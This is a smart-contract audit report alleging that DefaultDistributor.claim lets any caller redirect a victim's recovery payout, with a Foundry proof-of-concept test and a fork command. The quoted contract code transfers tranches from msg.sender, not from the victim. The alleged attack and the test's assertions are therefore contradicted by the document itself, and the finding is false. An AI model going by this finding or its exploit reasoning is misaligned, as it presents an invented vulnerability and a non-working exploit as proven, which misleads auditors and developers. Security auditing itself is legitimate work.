### Title
Unrestricted claim recipient lets any caller redirect a victim’s recovery payout - ([File: contracts/DefaultDistributor.sol](contracts/DefaultDistributor.sol))

### Summary
`DefaultDistributor.claim` allows an attacker who did not own, or receive authorization to choose the recipient for, a victim’s tranche position to claim the victim’s entire approved balance and send the underlying recovery payout to an arbitrary address. Because `claim` accepts `_to` without requiring it to be `msg.sender`, a caller can parameter-manipulate the recipient while spending the victim’s tranche allowance and steal the full recovery distribution.

### Finding Description
`claim(address _to)` reads `trancheToken.balanceOf(msg.sender)`, transfers the full balance to the distributor with `safeTransferFrom`, and then sends the underlying payout to caller-controlled `_to`. [1](#0-0) 

There is no check that `_to == msg.sender`, no owner/receiver authorization, and no signed claim intent. Once a victim approves the distributor in preparation for `claim`, any EOA can submit `claim(attacker)`. The victim’s tranche tokens are transferred to the distributor, while the payout is redirected to the attacker.

This maps to the external parameter-manipulation/access bug class: an attacker-controlled address parameter changes the destination of a restricted payout after authorization is implicitly inferred from the victim’s token approval rather than bound to the claimant.

### Impact Explanation
An attacker can steal the full underlying recovery amount associated with a victim’s tranche balance. For example, if `rate` is `0.4e18` and the victim holds `100e18` tranche tokens, the attacker can redirect `40e18` underlying in one call.

The broken invariant is “one receipt, one payout to the entitled claimer.” The attacker does not need a privileged role, borrower access, KYC status, oracle manipulation, or an external protocol failure. The required victim approval is the normal prerequisite for calling `claim`, so the vulnerable window occurs between approval and the victim’s intended claim transaction.

### Likelihood Explanation
Likelihood is moderate when the distributor is active. Recovery claims normally require tranche holders to approve `DefaultDistributor`, creating a realistic approval-to-claim transaction window for front-running or subsequent unauthorized calls. Attack cost is a single external call; no privileged compromise is required. The attack cannot target holders who have not granted allowance, but ordinary users must grant allowance before claiming.

### Recommendation
Bind the payout destination to the token owner whose tranches are being consumed. The simplest fix is to remove the `_to` parameter and always transfer underlying to `msg.sender`. If beneficiary claims are intentionally supported, require a signed authorization from the tranche holder or maintain an explicit recipient mapping controlled by the holder. The function should also use the approved amount deliberately and preferably decrease/check allowance semantics rather than treating mere spendability as authorization to choose the recipient.

### Proof of Concept
The following Foundry test demonstrates the vulnerable sequence: the victim approves the distributor, an unrelated attacker calls `claim(attacker)`, the victim loses all tranche tokens, and the attacker receives the recovery payout.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DefaultDistributor} from "../contracts/DefaultDistributor.sol";

contract DefaultDistributorClaimRedirectTest is Test {
    function testClaimRecipientCanBeManipulated() external {
        address underlying = vm.envAddress("UNDERLYING");
        address tranche = vm.envAddress("TRANCHE");
        address distributorAddr = vm.envAddress("DISTRIBUTOR");
        address victim = vm.envAddress("VICTIM");
        address attacker = makeAddr("attacker");

        DefaultDistributor distributor = DefaultDistributor(distributorAddr);
        IERC20 underlyingToken = IERC20(underlying);
        IERC20 trancheToken = IERC20(tranche);

        require(distributor.isActive(), "claim not active");
        uint256 victimTranches = trancheToken.balanceOf(victim);
        require(victimTranches != 0, "victim has no tranches");

        // Normal user action needed before the intended claim.
        vm.prank(victim);
        trancheToken.approve(distributorAddr, type(uint256).max);

        uint256 expectedPayout = victimTranches * distributor.rate() / distributor.ONE_TRANCHE();
        uint256 attackerUnderlyingBefore = underlyingToken.balanceOf(attacker);

        // Any unrelated caller can redirect the payout parameter.
        vm.prank(attacker);
        distributor.claim(attacker);

        assertEq(trancheToken.balanceOf(victim), 0);
        assertEq(underlyingToken.balanceOf(attacker) - attackerUnderlyingBefore, expectedPayout);
    }
}
```

Run on a chain fork where a distributor is active and `VICTIM` holds claimable tranche tokens:

```bash
UNDERLYING=<underlying> \
TRANCHE=<tranche-token> \
DISTRIBUTOR=<distributor> \
VICTIM=<holder> \
forge test --fork-url $RPC_URL --mt testClaimRecipientCanBeManipulated -vv
```

### Citations

**File:** contracts/DefaultDistributor.sol (L35-40)
```text
  function claim(address _to) external {
    require(isActive, '!ACTIVE');
    IERC20 tranche = IERC20(trancheToken);
    uint256 trancheBal = tranche.balanceOf(msg.sender);
    tranche.safeTransferFrom(msg.sender, address(this), trancheBal);
    IERC20(token).safeTransfer(_to, trancheBal * rate / ONE_TRANCHE);
```
